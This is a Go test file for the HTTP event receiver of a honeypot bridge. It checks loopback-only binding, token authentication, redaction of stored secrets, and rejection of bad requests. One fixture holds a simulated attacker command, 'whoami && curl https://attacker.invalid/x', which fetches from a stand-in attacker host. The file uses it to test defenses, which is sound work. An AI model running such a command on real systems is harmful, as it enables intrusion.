package server

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ivan-vhs/duckos-beelzebub-av-bridge/internal/store"
)

const testToken="0123456789abcdef0123456789abcdef0123456789abcdef"
func newTestServer(t *testing.T)(*Server,string) {
	t.Helper();root:=filepath.Join(t.TempDir(),"events")
	st,err:=store.New(root,"");if err!=nil {t.Fatal(err)}
	srv,err:=New(Config{Address:"127.0.0.1:9777",Token:testToken,Store:st});if err!=nil {t.Fatal(err)}
	return srv,root
}
func TestNewRequiresLoopbackAndStrongToken(t *testing.T) {
	st,err:=store.New(filepath.Join(t.TempDir(),"events"),"");if err!=nil {t.Fatal(err)}
	if _,err:=New(Config{Address:"0.0.0.0:9777",Token:testToken,Store:st});err==nil {t.Fatal("non-loopback bind accepted")}
	if _,err:=New(Config{Address:"127.0.0.1:9777",Token:"weak",Store:st});err==nil {t.Fatal("weak token accepted")}
}
func TestReceiveAuthenticatesAndPersistsRedactedEvent(t *testing.T) {
	srv,root:=newTestServer(t)
	incoming:=map[string]any{"Protocol":"SSH","RemoteAddr":"203.0.113.10:5522","User":"root","Password":"must-not-persist","Command":"whoami && curl https://attacker.invalid/x","CommandOutput":"private output","Body":"private body","Cookies":"sid=secret"}
	body,err:=json.Marshal(incoming);if err!=nil {t.Fatal(err)}
	req:=httptest.NewRequest(http.MethodPost,"/v1/events",bytes.NewReader(body));req.Header.Set("Content-Type","application/json");req.Header.Set("Authorization","Bearer "+testToken)
	response:=httptest.NewRecorder();srv.Handler().ServeHTTP(response,req)
	if response.Code!=http.StatusAccepted {t.Fatalf("status=%d body=%s",response.Code,response.Body.String())}
	entries,err:=os.ReadDir(root);if err!=nil {t.Fatal(err)}
	if len(entries)!=1 {t.Fatalf("expected one event log, got %d",len(entries))}
	stored,err:=os.ReadFile(filepath.Join(root,entries[0].Name()));if err!=nil {t.Fatal(err)}
	for _,secret:=range []string{"must-not-persist","private output","private body","sid=secret","whoami","root"} {if strings.Contains(string(stored),secret) {t.Fatalf("raw event data leaked %q",secret)}}
	if !strings.Contains(string(stored),`"severity":"HIGH"`) {t.Fatalf("missing classification: %s",stored)}
}
func TestReceiveRejectsUnauthorizedMalformedAndOversizedBodies(t *testing.T) {
	srv,_:=newTestServer(t)
	cases:=[]struct{name,token,contentType string;body []byte;want int}{
		{"unauthorized","wrong","application/json",[]byte(`{"Protocol":"HTTP"}`),http.StatusUnauthorized},
		{"wrong content type",testToken,"text/plain",[]byte(`{"Protocol":"HTTP"}`),http.StatusUnsupportedMediaType},
		{"malformed",testToken,"application/json",[]byte(`{bad`),http.StatusBadRequest},
		{"missing protocol",testToken,"application/json",[]byte(`{"Command":"x"}`),http.StatusBadRequest},
		{"two objects",testToken,"application/json",[]byte(`{"Protocol":"HTTP"}{"Protocol":"SSH"}`),http.StatusBadRequest},
		{"oversized",testToken,"application/json",[]byte(`{"Protocol":"HTTP","Command":"`+strings.Repeat("x",(1<<20)+1)+`"}`),http.StatusRequestEntityTooLarge},
	}
	for _,tc:=range cases {t.Run(tc.name,func(t *testing.T){
		req:=httptest.NewRequest(http.MethodPost,"/v1/events",bytes.NewReader(tc.body));req.Header.Set("Content-Type",tc.contentType);req.Header.Set("Authorization","Bearer "+tc.token)
		response:=httptest.NewRecorder();srv.Handler().ServeHTTP(response,req)
		if response.Code!=tc.want {t.Fatalf("status=%d want=%d body=%s",response.Code,tc.want,response.Body.String())}
	})}
}
func TestHealthDoesNotExposeToken(t *testing.T) {
	srv,_:=newTestServer(t);req:=httptest.NewRequest(http.MethodGet,"/healthz",nil);response:=httptest.NewRecorder()
	srv.Handler().ServeHTTP(response,req)
	if response.Code!=http.StatusOK {t.Fatalf("health status=%d",response.Code)}
	if strings.Contains(response.Body.String(),testToken) {t.Fatal("health response exposed token")}
}
